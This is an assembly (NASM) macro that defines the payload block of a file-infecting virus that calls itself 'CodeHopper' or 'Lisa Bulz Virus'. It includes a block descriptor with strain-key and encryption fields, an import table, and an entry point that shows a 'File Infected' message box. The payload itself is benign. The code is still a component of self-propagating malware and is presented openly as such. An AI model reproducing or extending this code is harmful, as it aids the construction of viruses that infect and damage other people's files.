%define PDB PayloadDrone_BlockDescryptor

%macro NASMHACKPD 0
;On Entry ebp Points To BlockDescriptor
PayloadDrone_BlockDescryptor:
PayloadDrone_StrainKey        DD 0
PayloadDrone_BlockSize        DD PayloadDrone_BlockTerminator-PDB
PayloadDrone_CryptionArray_   DD PayloadDrone_CryptionArray-PDB
PayloadDrone_Cryptions        DD 1
PayloadDrone_ImportArray_     DD PayloadDrone_ImportArray-PDB
PayloadDrone_EntryPoint:

mov  eax,[ebp+(PayloadDrone_ImportArray-PDB)+8]
push DWORD 0 ;MesageBox Style
lea  edx,[ebp+(PayloadDrone_TitleString-PDB)]
push edx     ;MessageBox Title
lea  edx,[ebp+(PayloadDrone_ContentString-PDB)]
push edx     ;MessageBox Text
push DWORD 0 ;Handle Of Owner Window (none)
call eax     ;Call MessageBoxA

RET

PayloadDrone_CryptionArray:
DD    0
DD    0

PayloadDrone_MessageBoxA DB "MessageBoxA",0
PayloadDrone_ImportArray:
DD 1                                         ;Number Of Imports
DD PayloadDrone_MessageBoxA-PDB              ;Address Of Name
DD 0                                         ;Address Of Function

PayloadDrone_TitleString   DB "CodeHopper.Drone",0
PayloadDrone_ContentString DB "File Infected",0xA,"CodeHopper Virus",0xA,"(AKA Lisa Bulz Virus)",0

PayloadDrone_BlockTerminator:
%endmacro
